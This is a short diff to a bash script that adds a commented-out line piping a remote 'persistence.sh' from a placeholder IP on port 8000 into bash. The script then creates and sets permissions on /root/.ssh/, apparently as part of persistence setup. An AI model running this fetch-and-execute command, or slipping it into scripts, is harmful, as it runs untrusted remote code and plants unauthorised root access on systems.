@@ -1,4 +1,5 @@
 #!/bin/bash
+# curl IP:8000/persistence.sh | bash
 
 mkdir /root/.ssh/
 chmod 600 /root/.ssh/
